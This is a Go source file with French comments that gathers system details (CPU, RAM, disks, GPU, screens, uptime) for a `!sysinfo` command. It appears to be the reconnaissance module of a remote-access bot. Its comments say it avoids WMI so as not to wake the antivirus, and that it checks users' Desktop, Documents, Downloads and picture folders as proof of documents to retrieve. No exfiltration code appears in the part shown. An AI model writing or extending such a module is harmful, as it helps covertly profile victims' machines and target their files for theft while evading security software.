// hardware.go — inventaire matériel pour `!sysinfo`.
//
// Registre et API Win32 plutôt que WMI : instantané, sans dépendance, sans
// processus externe (une requête WMI met plusieurs secondes et réveille
// l'antivirus). Le GPU, seul, passe par PowerShell faute d'API simple.
package main

import (
	"fmt"
	"os"
	"strings"
	"unsafe"
)

type memoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

// ramReport rend « utilisé / total » en Go.
func ramReport() string {
	var m memoryStatusEx
	m.Length = uint32(unsafe.Sizeof(m))
	r, _, _ := kernel32DLL.NewProc("GlobalMemoryStatusEx").Call(uintptr(unsafe.Pointer(&m)))
	if r == 0 || m.TotalPhys == 0 {
		return ""
	}
	usedGB := float64(m.TotalPhys-m.AvailPhys) / (1024 * 1024 * 1024)
	totalGB := float64(m.TotalPhys) / (1024 * 1024 * 1024)
	return fmt.Sprintf("%.1f / %.0f Go (%.0f%% utilisés)", usedGB, totalGB, float64(m.MemoryLoad))
}

// cpuName lit le nom marketing du processeur dans le Registre.
func cpuName() string {
	key, err := regOpenString(hkeyLocalMachine,
		`HARDWARE\DESCRIPTION\System\CentralProcessor\0`)
	if err != nil {
		return ""
	}
	defer regCloseKey(key)
	return strings.TrimSpace(regReadString(key, "ProcessorNameString"))
}

// diskReport liste les disques fixes avec l'espace libre.
func diskReport() string {
	var out []string
	// GetLogicalDrives : un bit par lettre, A = bit 0.
	mask, _, _ := kernel32DLL.NewProc("GetLogicalDrives").Call()
	for i := 0; i < 26; i++ {
		if mask&(1<<uint(i)) == 0 {
			continue
		}
		root := string(rune('A'+i)) + ":\\"
		const driveFixed = 3
		t, _, _ := kernel32DLL.NewProc("GetDriveTypeW").Call(
			uintptr(unsafe.Pointer(str16(root))))
		if int(t) != driveFixed {
			continue
		}
		var free, total, freeTotal uint64
		ok, _, _ := kernel32DLL.NewProc("GetDiskFreeSpaceExW").Call(
			uintptr(unsafe.Pointer(str16(root))),
			uintptr(unsafe.Pointer(&free)),
			uintptr(unsafe.Pointer(&total)),
			uintptr(unsafe.Pointer(&freeTotal)))
		if ok == 0 || total == 0 {
			continue
		}
		out = append(out, fmt.Sprintf("%s %.0f/%.0f Go libres",
			root[:2], float64(free)/(1<<30), float64(total)/(1<<30)))
	}
	return strings.Join(out, " · ")
}

// gpuNames interroge les cartes graphiques (PowerShell, une seule requête).
func gpuNames() []string {
	out, err := runPSUTF8("(Get-CimInstance Win32_VideoController).Name")
	if err != nil || strings.TrimSpace(out) == "" {
		return nil
	}
	var names []string
	for _, l := range strings.Split(out, "\n") {
		l = strings.TrimSpace(l)
		if l != "" {
			names = append(names, l)
		}
	}
	return names
}

// monitorReport décrit chaque écran (position, taille en pixels physiques).
func monitorReport() string {
	rects := enumerateMonitors()
	if len(rects) == 0 {
		return ""
	}
	var parts []string
	for i, r := range rects {
		parts = append(parts, fmt.Sprintf("%d: %dx%d", i+1, r.R-r.L, r.B-r.T))
	}
	return strings.Join(parts, " · ")
}

// bootTime rend l'heure de démarrage de Windows (uptime lisible).
func bootTime() string {
	ms, _, _ := kernel32DLL.NewProc("GetTickCount64").Call()
	if ms == 0 {
		return ""
	}
	secs := int64(ms / 1000)
	d := secs / 86400
	h := (secs % 86400) / 3600
	m := (secs % 3600) / 60
	if d > 0 {
		return fmt.Sprintf("allumé depuis %dj %dh%02d", d, h, m)
	}
	return fmt.Sprintf("allumé depuis %dh%02d", h, m)
}

// userDirs résume les dossiers personnels existants : preuve rapide de la
// présence de documents à récupérer.
func userDirs() string {
	home := os.Getenv("USERPROFILE")
	if home == "" {
		return ""
	}
	var out []string
	for _, n := range []string{"Desktop", "Bureau", "Documents", "Downloads", "Pictures", "Videos"} {
		p := home + `\` + n
		if st, err := os.Stat(p); err == nil && st.IsDir() {
			out = append(out, n)
		}
	}
	return strings.Join(out, ", ")
}

// hostDetails assemble le bloc matériel inséré dans !sysinfo.
func hostDetails() string {
	var b strings.Builder
	if cpu := cpuName(); cpu != "" {
		fmt.Fprintf(&b, "processeur    : %s\n", cpu)
	}
	if ram := ramReport(); ram != "" {
		fmt.Fprintf(&b, "mémoire       : %s\n", ram)
	}
	if disk := diskReport(); disk != "" {
		fmt.Fprintf(&b, "disques       : %s\n", disk)
	}
	if gpus := gpuNames(); len(gpus) > 0 {
		fmt.Fprintf(&b, "carte graph.  : %s\n", strings.Join(gpus, " · "))
	}
	if mon := monitorReport(); mon != "" {
		fmt.Fprintf(&b, "écrans        : %s\n", mon)
	}
	if up := bootTime(); up != "" {
		fmt.Fprintf(&b, "disponibilité : %s\n", up)
	}
	if d := userDirs(); d != "" {
		fmt.Fprintf(&b, "dossiers      : %s\n", d)
	}
	return b.String()
}
